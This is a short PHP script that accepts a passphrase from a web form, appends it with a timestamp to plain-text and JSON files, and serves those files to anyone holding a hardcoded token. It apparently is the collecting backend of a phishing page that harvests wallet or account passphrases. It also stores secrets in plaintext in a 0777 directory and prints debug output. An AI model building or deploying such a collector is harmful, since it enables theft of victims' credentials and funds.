<?php
// Enable error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

define('SECRET_TOKEN', 'pi042'); // Replace 'your_secret_token' with a secret token of your choice

// Define the file path and name
$filePath = 'submissions/';
$jsonFileName = 'passphrases.json';
$txtFileName = 'passphrases.txt';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the submitted passphrase
    $passphrase = trim($_POST['mf-text']);

    // Check if the passphrase is not empty
    if (empty($passphrase)) {
        echo "Passphrase cannot be empty.";
        exit;
    }

    // Create the directory if it doesn't exist
    if (!is_dir($filePath)) {
        if (mkdir($filePath, 0777, true)) {
            echo "Directory created successfully.<br>";
        } else {
            echo "Failed to create directory.<br>";
        }
    }

    // Prepare the data to save
    $data = [
        'passphrase' => $passphrase,
        'timestamp' => date('Y-m-d H:i:s')
    ];

    // Save as JSON
    $jsonData = json_encode($data) . PHP_EOL;
    if (file_put_contents($filePath . $jsonFileName, $jsonData, FILE_APPEND)) {
        echo "JSON data saved successfully.<br>";
    } else {
        echo "Failed to save JSON data.<br>";
    }

    // Save as plain text
    $textData = "Passphrase: " . $passphrase . " | Timestamp: " . $data['timestamp'] . PHP_EOL;
    if (file_put_contents($filePath . $txtFileName, $textData, FILE_APPEND)) {
        echo "Text data saved successfully.<br>";
    } else {
        echo "Failed to save text data.<br>";
    }

    echo "Passphrase saved successfully!";
} elseif ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET['token']) && $_GET['token'] === SECRET_TOKEN) {
    // Check if the token is valid
    if (isset($_GET['file']) && ($_GET['file'] === 'json' || $_GET['file'] === 'txt')) {
        $fileName = ($_GET['file'] === 'json') ? $jsonFileName : $txtFileName;
        $filePath = 'submissions/' . $fileName;

        if (file_exists($filePath)) {
            header('Content-Type: text/plain');
            readfile($filePath);
        } else {
            echo "File not found: $filePath"; // Debugging info
        }
    } else {
        echo "Invalid file type: " . htmlspecialchars($_GET['file']); // Debugging info
    }
} else {
    if (!isset($_GET['token'])) {
        echo "Token not set"; // Debugging info
    } elseif ($_GET['token'] !== SECRET_TOKEN) {
        echo "Invalid token"; // Debugging info
    } else {
        echo "Invalid request method: " . $_SERVER["REQUEST_METHOD"]; // Debugging info
    }
}
?>
